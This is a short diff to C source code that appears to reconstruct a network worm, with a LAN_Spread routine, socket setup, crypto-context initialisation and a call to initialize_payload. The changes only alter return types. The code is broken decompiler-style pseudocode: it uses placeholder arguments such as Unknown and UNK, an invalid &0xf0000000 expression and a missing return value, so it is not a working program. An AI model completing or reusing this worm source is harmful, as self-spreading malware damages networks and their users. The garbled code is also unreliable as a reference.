@@ -37,13 +37,13 @@ int LAN_Spread()
 }
 
 //not finished
-HGLOBAL InitCryptoContext()
+void InitCryptoContext()
 {
 	CryptAcquireContextA(Unknown, NULL, UNK, UNK, &0xf0000000);
 	InitializeCriticalSection(LPCRITICAL_SECTION, &UNKNOWN);
 }
 
-HGLOBAL initializeSockets()
+int initializeSockets()
 {
 	WSADATA WSAData;
 	if(WSAStartup(MAKEWORD(2,2), &WSAData))
@@ -51,12 +51,12 @@ HGLOBAL initializeSockets()
 		return 0;
 	}
 	InitCryptoContext(); //CryptAcquireContext
-	return initialize_payload();
+	initialize_payload();
 }
 
-HGLOBAL InitOperations()
+int InitOperations()
 {
-	HGLOBAL result;
+	int result;
 	int threadCount;
 	result = initializeSockets();
 	if(result)
